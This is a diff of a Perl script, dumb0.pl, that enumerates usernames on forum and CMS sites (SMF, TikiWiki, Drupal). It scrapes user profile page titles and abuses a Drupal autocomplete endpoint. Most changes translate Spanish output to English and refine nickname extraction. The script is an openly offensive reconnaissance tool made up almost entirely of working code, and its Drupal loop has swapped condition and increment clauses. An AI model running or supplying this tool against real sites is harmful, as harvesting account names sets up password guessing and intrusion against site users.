@@ -3,7 +3,7 @@
 # Email: overloadblog////hotmail////es             #
 # Blog: 0verl0ad.blogspot.com                      #
 # Twitter: https://twitter.com/TheXC3LL            #
-######################  v0.1  ######################
+######################  v0.1.2  ####################
 
 use LWP::UserAgent;
 use Getopt::Long;
@@ -72,7 +72,7 @@ if ($flag_type eq "TikiWiki") { $tail = "/tiki-user_information.php?userId="; }
 
 
 if ($flag_log) {
-	print "[!] Introduzca la cookie para mandar las peticiones desde su sesion\n\n";
+	print "[!] Insert the session cookie\n\n";
 	print "/!\\ Cookie> ";
 	$cookie = <STDIN>;
 	chomp($cookie);
@@ -80,26 +80,31 @@ if ($flag_log) {
 $i = "1";
 
 
-
-print "[!] Para poder iniciar la busqueda de usuarios primero usted debe indicar el patron a eliminar\n";
-print "[!] Copie y pege debajo el texto que viene DESPUES del author incluyendo el espacio\n\n";
-
 $ua = LWP::UserAgent->new; $ua->agent('Mozilla/5.0 (X11; Linux i686; rv:17.0) Gecko/20131030');
 $response = $ua->get($flag_url.$tail."2", Cookie => $cookie);
+if (!$response->is_success) { die "[-] ERROR: URL couldn't be reached (Wrong URL?)\n"; }
+
+print "[!] You need to configure the patterns\n";
+print "[!] Copy and paste what is BEFORE and AFTER the user nick\n\n";
+
+
 $html = $response->decoded_content;
 @contenido = split("\n", $html);
 foreach $linea (@contenido) {
 	if ($linea =~ m/\<title\>(.*?)\<\/title\>/g) {
-		print "/!\\-> ".$1."\n\nInserte aqui > ";
+		print "/!\\-> ".$1."\n\nAFTER > ";
 		$patron = <STDIN>;
 		chomp($patron);
 		$size = length($patron);
-		$off = 0 - $size;
+		print "\n\nBEFORE > ";
+		$begin = <STDIN>;
+		chomp($begin);
+		$bsize = length($begin);
 	}
 }
  
 
-print "\n[!] Empezando el dumpeo en $flag_url...\n\n";
+print "\n[!] Dumping users from $flag_url...\n\n";
 
 $j = 0;
 while ($j <= 10) { 
@@ -119,18 +124,20 @@ while ($j <= 10) {
 			$tl = length($titulo);
 			$ul = $tl - $size;
 			$usuario = substr($titulo,0, $ul);
+			$ul = length($usuario);
+			$usuario = substr($usuario, $bsize, $ul);
 			if ($flag_file) { print FILE $usuario."\n";}
-			print "[+] Posible usuario encontrado ~> ".$usuario."\n";
+			print "[+] Posible user found ~> ".$usuario."\n";
 			$i++; $j = 0;
 		}
 	}	
 
 
-print "[!] Dumpeo finalizado con exito\n\n";
+print "[!] Work finished\n\n";
 
 sub use {
 print q(
-	Uso: perl dumb0.pl --type=[CMS] --url=[TARGET URL] [--log] [--file]
+	Use: perl dumb0.pl --type=[CMS] --url=[TARGET URL] [--log] [--file]
 		
 	Supported: 
 			SMF   	 --		Simple Machine Forums
@@ -170,7 +177,7 @@ sub drupal {
 	$ua = LWP::UserAgent->new; $ua->agent('Mozilla/5.0 (X11; Linux i686; rv:17.0) Gecko/20131030');
 	for ($i = 33; $i++; $i < 127) {
 		$url = $target."/?q=admin/views/ajax/autocomplete/user/".chr($i);
-		print "[+] Comprobando usuarios que empiezan por... ".chr($i)."\n";
+		print "[+] Checking for users wich nicks start with... ".chr($i)."\n";
 		$response = $ua->get($url);
 		$string = $response->decoded_content;
 		chop($string);
@@ -181,12 +188,10 @@ sub drupal {
 			$user_clean = substr($nick[0], 1);
 			$user_clean =~ s/\\u0027/\'/g;
 			if ($flag_file) { print FILE $user_clean."\n";}
-			print "\t\t[-] Usuario encontrado: $user_clean\n";
+			print "\t\t[-] User found: $user_clean\n";
 		}
 	}
 }
 
 
 close(FILE);
-
-
